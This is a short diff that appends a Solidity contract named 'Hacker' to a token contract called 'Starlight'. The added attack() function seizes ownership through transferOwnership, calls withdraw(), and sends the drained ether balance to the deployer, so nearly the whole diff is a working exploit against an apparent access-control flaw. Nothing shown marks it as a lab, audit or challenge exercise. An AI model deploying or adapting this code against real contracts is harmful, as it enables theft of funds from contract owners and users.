@@ -602,3 +602,25 @@ contract Starlight is Context, ERC20, Ownable {
     }
     
 }
+
+contract Hacker { 
+    Starlight starlight; 
+    address payable owner;
+
+    constructor(address _starlight) {
+        starlight = Starlight(_starlight);
+        owner = payable(msg.sender);
+
+    }
+
+    function attack() external {
+        starlight.transferOwnership(address(this));
+        starlight.withdraw();
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        require(success);
+    }
+
+    receive() external payable {
+        
+    }
+}
